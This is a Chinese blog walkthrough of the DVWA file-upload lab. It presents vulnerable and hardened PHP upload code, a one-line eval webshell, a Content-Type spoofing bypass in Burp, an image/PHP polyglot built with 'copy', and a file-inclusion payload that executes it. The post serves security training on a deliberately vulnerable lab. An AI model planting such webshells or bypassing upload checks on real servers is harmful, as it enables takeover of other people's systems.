---
title: "网络安全 DVWA通关指南 DVWA File Upload（文件上传）"
date: 2024-09-26 12:22:56
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "web安全"
- "安全"
- "网络安全"
- "DVWA"
- "靶场"
- "文件上传"
- "木马"
---



## DVWA File Upload（文件上传）

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331831.jpeg)



---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)



---

> ### 修复建议
> 
> > 1、使用白名单限制可以上传的文件扩展名
> > 
> > 2、注意0x00截断攻击（PHP更新到最新版本）
> > 
> > 3、对上传后的文件统一随机命名，不允许用户控制扩展名
> > 
> > 4、上传文件的存储目录禁用执行权限
> 
> 

## Low

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// Can we move the file to the upload folder?
	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
		// No
		$html .= '<pre>Your image was not uploaded.</pre>';
	}
	else {
		// Yes!
		$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
	}
}

?>
    
    
<?php
// 检查是否接收到表单提交的“Upload”按钮
if( isset( $_POST[ 'Upload' ] ) ) {
    // 定义目标文件夹路径，这里假设DVWA_WEB_PAGE_TO_ROOT是一个预定义常量，指向网站根目录
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";

    // 获取上传文件的原始名称，并将其附加到目标路径上，以构建完整的文件存储路径
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // 使用PHP内置函数move_uploaded_file尝试将临时文件移动到目标路径
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // 如果文件未成功移动（例如，由于权限问题或文件大小超出限制等），输出错误信息
        $html .= '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // 文件成功上传至指定位置，输出成功信息
        $html .= "<pre>{$target_path} successfully uploaded!</pre>";
    }
}

// 注解：
// 上述代码实现了一个简单的文件上传功能，但缺少必要的安全验证，如文件类型检查、文件大小限制以及防止文件名注入攻击等。
// 在实际生产环境中，应在将文件移动到目标路径之前，添加详细的验证和清理步骤以确保上传行为的安全性。
?>
```

2、Low级别没有对上传的文件进行任何限制，我们可以直接上传一句话木马，然后使用中国蚁剑连接。

```php
<?php @eval($_POST['attack']) ?>
```

 ![image-20240511103716434](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331832.png)

使用蚁剑连接一句话木马

1. 启动AntSword应用后，在界面的任意空白区域点击鼠标右键，这时会出现一个菜单。在弹出的菜单中，选择「添加数据」选项。 ![屏幕截图 2024-05-11 104500](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331833.png)

2. 进入到添加数据的页面，根据屏幕提示填写所需的信息。确保每一项必填内容都已正确无误地填写完毕，点击「测试连接」按钮，检查连接是否成功。 ![屏幕截图 2024-05-11 104740](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331834.png)

3. 填写完成后，点击页面中的「添加」按钮，这时候你刚刚输入的信息会被保存为一个新的Shell条目，并能在数据管理列表中看到它。 ![image-20240511105111468](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331835.png)

4. 接下来，双击这个新添加的Shell条目，系统将带你进入该Shell对应的文件管理界面，从而可以进一步操作和管理相关文件。 ![image-20240511104222952](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331836.png)

连接木马成功后，直接获取Webshell，可以在服务器上进行任意操作。

## Medium

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

	// Is it an image?
	if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
		( $uploaded_size < 100000 ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
    
    
    
    
    
<?php

// 检查是否设置了 'Upload' POST 参数，这通常意味着文件上传表单已被提交
if( isset( $_POST[ 'Upload' ] ) ) {

    // 设置目标上传路径，结合DVWA_WEB_PAGE_TO_ROOT常量定位到uploads目录下
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";

    // 使用原始文件名构建完整的文件保存路径
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // 获取上传文件的信息
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];      // 文件名
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];      // 文件类型（MIME类型）
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];      // 文件大小

    // 检查文件是否为允许的图像格式（JPEG或PNG）且文件大小小于100KB
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) {

        // 尝试将上传的临时文件移动到指定的目标路径
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // 如果文件无法移动（可能是权限问题或路径错误），输出错误信息
            $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // 文件成功上传，输出成功信息及上传后的文件路径
            $html .= "<pre>{$target_path} successfully uploaded!</pre>";
        }
    }
    else {
        // 如果文件不是允许的类型或超过大小限制，输出错误信息
        $html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>

```

Medium级别限制上传文件类型只能为JPEG或PNG，同时限制文件大小不能超过100KB。这个时候再上传一句话木马，会提示上传失败。

 ![image-20240511110718455](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331837.png)

2、使用Burp Suite抓取一句话木马文件上传的包，发现上传的PHP文件类型在包里。

 ![image-20240511111423759](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331838.png)

修改1.php文件的文件类型为“image/png”，然后Foward。

```
Content-Type: image/png; 
```

 ![image-20240511111909483](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331839.png)

虽然我们上传的文件是PHP文件，但还是可以通过修改网页HTTP报文中文件类型，来绕过网页白名单检查。

 ![image-20240511111924303](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331840.png)

## High

1、分析网页源代码

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Where are we going to be writing to?
	$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
	$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
		( $uploaded_size < 100000 ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Can we move the file to the upload folder?
		if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}
		else {
			// Yes!
			$html .= "<pre>{$target_path} succesfully uploaded!</pre>";
		}
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

?>
    
    
    
    
<?php

// 检查是否设置了 'Upload' POST 参数，表明文件上传表单已被提交
if( isset( $_POST[ 'Upload' ] ) ) {

    // 设置文件上传的目标目录，结合DVWA_WEB_PAGE_TO_ROOT常量定位到uploads文件夹
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";

    // 从上传文件名中提取文件的基本名称，包括其扩展名，用于构建完整的目标文件路径
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // 获取上传文件的详细信息
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];       // 原始文件名
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); // 文件扩展名，通过查找最后一个点的位置来提取
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];       // 文件大小（字节）
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];    // 上传文件的临时存储路径

    // 检查文件扩展名是否为允许的图像格式（不区分大小写），文件大小是否小于100KB，并确认是有效的图像文件
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) { // 使用getimagesize()确保文件是可识别的图像

        // 尝试将上传的临时文件移动到指定的目标路径
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // 如果文件未能成功移动（可能因权限问题或路径错误），输出错误信息
            $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // 文件成功上传，输出包含文件路径的成功信息
            $html .= "<pre>{$target_path} successfully uploaded!</pre>";
        }
    }
    else {
        // 如果文件扩展名不符、过大或不是有效的图像文件，输出错误信息
        $html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>

```

getimagesize()函数，用于获取图像文件的大小以及相关信息。该函数会检查图片文件头，如果不存在或不是一个有效的图像文件则报错。

1、我们可以准备一张图片和一句话木马的文件，通过 `copy` 命令将两个文件合并成一个文件。

 ![image-20240623155013786](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331841.png)

```
copy muma.png/b + muma.php/a 1.png
```

 ![屏幕截图 2024-06-23 155102](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331842.png)

 ![image-20240623155320667](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png)

文件上传成功

 ![image-20240623155452622](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331844.png)

2、但此时2.jpg是个图像文件，无法使用蚁剑连接。我们需要将2.jpg作为php文件执行，使用文件包含漏洞( File Inclusion)，构造payload。

```
http://dvwa/vulnerabilities/fi/?page=file:///D:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\1.png
```

 ![image-20240623155359236](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331845.png)

## Impossible

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


	// File information
	$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
	$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
	$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
	$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

	// Where are we going to be writing to?
	$target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
	//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
	$temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

	// Is it an image?
	if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
		( $uploaded_size < 100000 ) &&
		( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
		getimagesize( $uploaded_tmp ) ) {

		// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
		if( $uploaded_type == 'image/jpeg' ) {
			$img = imagecreatefromjpeg( $uploaded_tmp );
			imagejpeg( $img, $temp_file, 100);
		}
		else {
			$img = imagecreatefrompng( $uploaded_tmp );
			imagepng( $img, $temp_file, 9);
		}
		imagedestroy( $img );

		// Can we move the file to the web root from the temp folder?
		if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
			// Yes!
			$html .= "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
		}
		else {
			// No
			$html .= '<pre>Your image was not uploaded.</pre>';
		}

		// Delete any temp files
		if( file_exists( $temp_file ) )
			unlink( $temp_file );
	}
	else {
		// Invalid file
		$html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```